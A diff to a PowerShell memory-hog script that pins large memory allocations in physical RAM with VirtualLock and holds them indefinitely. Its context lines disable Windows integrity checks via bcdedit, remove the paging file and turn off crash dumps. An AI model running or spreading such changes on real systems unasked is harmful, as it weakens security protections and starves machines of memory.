@@ -21,6 +21,9 @@ using System.Runtime.InteropServices;
 
 public class MemLock {
     [DllImport("kernel32.dll")]
+    public static extern bool VirtualLock(IntPtr lpAddress, UIntPtr dwSize);
+
+    [DllImport("kernel32.dll")]
     public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     
     [DllImport("advapi32.dll", SetLastError=true)]
@@ -75,7 +78,7 @@ Invoke-Expression "bcdedit /set disabledynamictick yes"
 Invoke-Expression "bcdedit /set nointegritychecks yes"
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force
-Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force
 
 Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
 Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber
@@ -106,6 +109,9 @@ $memHogScript = {
         }
         
         try{
+            if (-not ([MemLock]::VirtualLock($alloc, [UIntPtr][uint64]$chunkSize))) {
+                throw "VirtualLock failed"
+            }
             # Touch memory to force physical allocation
             [System.Runtime.InteropServices.Marshal]::WriteInt64($ptr, [DateTime]::Now.Ticks)
             $chunk = New-Object byte[] $chunkSize
@@ -120,7 +126,11 @@ $memHogScript = {
     }    
 
     # Hold memory indefinitely
-    while ($true) { Start-Sleep -Seconds 3600 }
+    while ($true) { 
+        [GC]::Collect()
+        [GC]::WaitForPendingFinalizers()
+        Start-Sleep -Seconds 3600 
+    }
 }
 
 # --- Launch Memory Hogs ---
